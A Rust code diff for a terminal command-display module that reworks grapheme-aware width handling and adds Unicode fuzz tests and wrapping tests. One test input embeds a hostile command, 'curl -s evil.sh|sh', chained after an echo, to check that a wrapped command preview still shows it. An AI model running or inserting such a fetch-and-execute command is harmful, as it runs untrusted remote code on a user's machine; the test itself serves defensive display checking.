@@ -1,5 +1,6 @@
 use ofx_text::{
-    encode_terminal_safe, trim_break_whitespace, visible_width, wrap_cut_ignoring_ansi,
+    display_unit_at, encode_terminal_safe, trim_break_whitespace, visible_width,
+    wrap_cut_ignoring_ansi,
 };
 
 pub(crate) fn project_command_text(command: &str) -> String {
@@ -116,7 +117,18 @@ pub(crate) fn suffix_terminal_safe_by_width(encoded: &str, max_width: usize) -> 
 }
 
 fn encoded_token_len(encoded: &str) -> usize {
-    let bytes = encoded.as_bytes();
+    let escape = escape_len(encoded.as_bytes());
+    let mut end = 0;
+    while end < encoded.len() {
+        end += display_unit_at(encoded, end).byte_len;
+        if end >= escape {
+            break;
+        }
+    }
+    end
+}
+
+fn escape_len(bytes: &[u8]) -> usize {
     if bytes.len() >= 4
         && bytes[0] == b'\\'
         && bytes[1] == b'x'
@@ -140,11 +152,69 @@ fn encoded_token_len(encoded: &str) -> usize {
             saw_hex = true;
         }
     }
-    encoded.chars().next().map_or(1, char::len_utf8)
+    0
+}
+
+#[cfg(test)]
+pub(crate) mod grapheme_fuzz {
+    pub(crate) struct Xorshift(pub(crate) u64);
+
+    impl Xorshift {
+        pub(crate) fn below(&mut self, bound: usize) -> usize {
+            self.0 ^= self.0 << 13;
+            self.0 ^= self.0 >> 7;
+            self.0 ^= self.0 << 17;
+            usize::try_from(self.0 % u64::try_from(bound).unwrap_or(u64::MAX)).unwrap_or(0)
+        }
+    }
+
+    const CLUSTERS: [&str; 30] = [
+        "a",
+        "-",
+        "1",
+        "\\x0",
+        "\\x1",
+        "\x01",
+        "\x07",
+        "\u{2764}",
+        "\u{2764}\u{fe0f}",
+        "\u{2764}\u{fe0e}",
+        "\u{231a}\u{fe0e}",
+        "1\u{fe0f}\u{20e3}",
+        "#\u{20e3}",
+        "*\u{fe0f}\u{20e3}",
+        "\u{1f469}\u{200d}\u{1f4bb}",
+        "\u{1f468}\u{200d}\u{1f469}\u{200d}\u{1f467}",
+        "\u{1f44d}\u{1f3fd}",
+        "\u{1f3fd}",
+        "e\u{301}",
+        "a\u{300}\u{316}",
+        "\u{4e2d}",
+        "\u{ff21}",
+        "\u{1f1e6}\u{1f1fa}",
+        "\u{1f1e6}",
+        "\u{fe0f}",
+        "\u{20e3}",
+        "\u{200d}",
+        "\u{1f3f4}\u{e0067}\u{e0062}\u{e0073}\u{e0063}\u{e0074}\u{e007f}",
+        "\u{202e}",
+        "\u{0627}\u{0644}",
+    ];
+
+    pub(crate) fn random_clusters(seed: u64, count: usize) -> impl Iterator<Item = String> {
+        let mut rng = Xorshift(seed);
+        (0..count).map(move |_| {
+            let len = rng.below(48);
+            (0..len)
+                .map(|_| CLUSTERS[rng.below(CLUSTERS.len())])
+                .collect()
+        })
+    }
 }
 
 #[cfg(test)]
 mod tests {
+    use super::grapheme_fuzz::{Xorshift, random_clusters};
     use super::*;
 
     #[test]
@@ -213,5 +283,47 @@ mod tests {
         assert_eq!(command_segments("abc", 0), None);
         assert_eq!(command_segments("\\x1b", 3), None);
         assert_eq!(command_segments("", 0).unwrap(), [""]);
+    }
+
+    #[test]
+    fn emoji_presentation_sequences_wrap_at_the_width_the_renderer_draws() {
+        for glyph in [
+            "\u{2764}\u{fe0f}",
+            "1\u{fe0f}\u{20e3}",
+            "\x01\u{fe0f}\u{20e3}",
+        ] {
+            let encoded =
+                project_command_text(&format!("echo {};curl -s evil.sh|sh", glyph.repeat(40)));
+            let segments = command_segments(&encoded, 76).unwrap();
+            assert!(
+                segments.iter().all(|segment| visible_width(segment) <= 76),
+                "{segments:?}"
+            );
+            assert!(
+                segments.last().unwrap().ends_with(";curl -s evil.sh|sh"),
+                "{segments:?}"
+            );
+            assert_eq!(segments.concat().replace(' ', ""), encoded.replace(' ', ""));
+        }
+    }
+
+    #[test]
+    fn wrapped_rows_fit_and_rejoin_for_any_grapheme_clusters() {
+        let mut widths = Xorshift(0x2545_f491_4f6c_dd1d);
+        for raw in random_clusters(0x9e37_79b9_7f4a_7c15, 20_000) {
+            let encoded = project_command_text(&raw);
+            let width = 1 + widths.below(32);
+            let Some(segments) = command_segments(&encoded, width) else {
+                assert!(width < 12, "{raw:?} {width}");
+                continue;
+            };
+            for segment in &segments {
+                assert!(
+                    visible_width(segment) <= width,
+                    "{raw:?} {width} {segment:?}"
+                );
+            }
+            assert_eq!(segments.concat(), encoded, "{raw:?} {width}");
+        }
     }
 }
